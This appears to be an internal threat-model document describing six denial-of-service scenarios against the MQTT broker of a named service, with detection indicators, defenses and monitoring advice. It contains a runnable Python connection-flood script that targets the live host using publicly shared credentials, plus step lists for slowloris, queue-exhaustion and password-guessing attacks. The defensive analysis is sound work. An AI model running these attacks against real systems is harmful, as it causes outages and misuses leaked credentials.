# DoS Attack Vectors and Scenarios

This document describes specific attack scenarios against the Makapix Club MQTT infrastructure.

> **Warning:** This document is for defensive security purposes only. Do not execute these attacks against production systems without authorization.

---

## Attack 1: WebSocket Connection Flood

**Target:** MQTT WebSocket listener (port 9001)  
**Difficulty:** Trivial  
**Impact:** Complete service outage

### Prerequisites

- Internet access to `makapix.club`
- Knowledge of shared credentials (publicly available in source code)

### Attack Description

The attacker opens thousands of WebSocket connections using the shared `webclient` credentials, exhausting server resources.

### Conceptual Attack Flow

```
1. Attacker reads credentials from web/src/lib/mqtt-client.ts
   - Username: "webclient"
   - Password: "webclient"

2. Attacker connects via WebSocket to wss://makapix.club/mqtt

3. Attacker repeats connection in a loop:
   - Each connection consumes a file descriptor
   - Each connection consumes memory for session state
   - Mosquitto tracks subscriptions per connection

4. Server exhausts resources:
   - File descriptor limit reached (default: 1024, configured: unknown)
   - Memory exhaustion triggers OOM killer
   - New legitimate connections rejected
```

### Attack Pseudocode

```python
# WARNING: For educational purposes only
import paho.mqtt.client as mqtt
import threading

TARGET = "makapix.club"
PORT = 9001  # WebSocket port (via Caddy proxy)
CONNECTIONS = []

def create_connection(i):
    client = mqtt.Client(
        client_id=f"attacker-{i}",
        transport="websockets"
    )
    client.username_pw_set("webclient", "webclient")
    client.ws_set_options(path="/mqtt")
    try:
        client.connect(TARGET, 443, keepalive=60)
        client.loop_start()
        CONNECTIONS.append(client)
    except Exception as e:
        print(f"Connection {i} failed: {e}")

# Create thousands of connections
for i in range(50000):
    t = threading.Thread(target=create_connection, args=(i,))
    t.start()
    if i % 100 == 0:
        print(f"Created {i} connections")
```

### Detection Indicators

- Rapid increase in MQTT connection count
- Many connections from same IP/IP range
- Connection rate exceeds normal patterns
- File descriptor warnings in system logs

### Current Defenses

**None effective:**
- Password authentication exists but credentials are shared
- No connection limits configured
- No per-IP rate limiting
- No connection monitoring

---

## Attack 2: Slow Connection Attack (Slowloris Variant)

**Target:** MQTT WebSocket listener  
**Difficulty:** Easy  
**Impact:** Connection slot exhaustion

### Attack Description

Instead of completing connections quickly, the attacker opens connections slowly and keeps them alive with minimal traffic, tying up server resources.

### Attack Flow

```
1. Open WebSocket connection
2. Send MQTT CONNECT packet very slowly (byte by byte)
3. Once connected, send PINGREQ at minimum interval to stay alive
4. Never subscribe or do useful work
5. Repeat with many connections
```

### Impact

- Ties up connection slots
- Consumes memory for incomplete/idle sessions
- Legitimate users cannot connect

### Current Defenses

- Mosquitto has default timeouts, but they may be generous
- No specific slowloris protection

---

## Attack 3: Message Queue Exhaustion

**Target:** MQTT broker memory  
**Difficulty:** Medium  
**Impact:** Memory exhaustion, service crash

### Prerequisites

- Ability to connect as `webclient`
- Knowledge of topic structure

### Attack Description

```
1. Create many client connections
2. Each client subscribes to makapix/social-notifications/#
3. Disconnect all clients (do not send DISCONNECT, just close socket)
4. Broker queues messages for "disconnected" clients (QoS 1 behavior)
5. Trigger high volume of notifications (via reactions, comments)
6. Messages accumulate in broker memory
7. Eventually OOM
```

### Amplification Factor

If notifications are sent to topics with many subscribed (disconnected) clients, each message is queued multiple times.

### Current Defenses

- No `max_queued_messages` configured
- No `max_queued_bytes` configured
- Default behavior queues indefinitely

---

## Attack 4: Subscription Storm

**Target:** MQTT broker CPU/memory  
**Difficulty:** Easy  
**Impact:** Performance degradation

### Attack Description

Rapidly subscribe and unsubscribe to many topics:

```
1. Connect as webclient
2. Subscribe to makapix/post/new/user/1/+
3. Unsubscribe
4. Subscribe to makapix/post/new/user/2/+
5. Unsubscribe
6. ... repeat thousands of times
```

### Impact

- CPU overhead processing subscription changes
- Memory churn from subscription table updates
- Slower message routing for legitimate users

### Current Defenses

- ACLs limit which topics can be subscribed
- No rate limiting on subscription operations

---

## Attack 5: Internal Port Exploitation

**Target:** MQTT internal listener (port 1883)  
**Difficulty:** Requires network access  
**Impact:** Unauthorized broker access

### Prerequisites

- VPS firewall misconfiguration allowing port 1883 access
- OR compromise of another service on the VPS

### Attack Description

```
1. Scan for open port 1883 on target
2. If accessible, connect directly (no TLS required)
3. Attempt authentication with common passwords
4. If password file is weak/default, gain access
5. Publish to any topic (including player commands)
```

### Impact

- Full broker access
- Ability to publish malicious commands to players
- Privacy breach (read all messages)

### Current Defenses

- Docker network isolation (intended)
- Password file authentication
- VPS firewall (external dependency)

### Weakness

Port is explicitly bound in docker-compose.yml, creating unnecessary exposure.

---

## Attack 6: mTLS Handshake Exhaustion

**Target:** MQTT mTLS listener (port 8883)  
**Difficulty:** Moderate  
**Impact:** CPU exhaustion, slower handshakes

### Attack Description

Initiate many TLS handshakes without completing them, or complete them with invalid certificates:

```
1. Open TCP connection to port 8883
2. Begin TLS handshake
3. Either:
   a. Abandon handshake (resource consumed during parsing)
   b. Send invalid certificate (server validates, then rejects)
4. Repeat rapidly
```

### Impact

- TLS handshake is CPU-intensive (RSA/ECDSA operations)
- Server wastes cycles on failed handshakes
- Legitimate devices experience slower connections

### Mitigating Factors

- Valid certificate required for sustained connection
- CRL checking prevents revoked certs
- Attack is resource-intensive for attacker too

### Current Defenses

- mTLS provides strong authentication barrier
- CRL revocation support
- No explicit rate limiting (could improve)

---

## Attack Comparison Matrix

| Attack | Skill Required | Resources Needed | Impact | Detectability |
|--------|---------------|------------------|--------|---------------|
| WebSocket flood | Low | Single machine | High | Medium |
| Slowloris | Low | Single machine | Medium | Low |
| Queue exhaustion | Medium | Single machine | High | Low |
| Subscription storm | Low | Single machine | Low | Medium |
| Internal port | Medium | Network access | Critical | High |
| mTLS exhaustion | Medium | Multiple machines | Low | Medium |

---

## Recommended Monitoring

To detect these attacks, monitor:

1. **Connection metrics:**
   - Total active connections (alert at 80% of max)
   - Connections per IP (alert on anomalies)
   - Connection rate (alert on spikes)

2. **Resource metrics:**
   - Broker memory usage
   - File descriptor count
   - CPU utilization

3. **Authentication metrics:**
   - Failed auth attempts
   - Successful connections per minute

4. **Message metrics:**
   - Queued message count
   - Message throughput

---

## References

- [Slowloris Attack](https://en.wikipedia.org/wiki/Slowloris_(computer_security))
- [MQTT Protocol Specification](https://docs.oasis-open.org/mqtt/mqtt/v5.0/mqtt-v5.0.html)
- [Mosquitto Security](https://mosquitto.org/documentation/authentication-methods/)
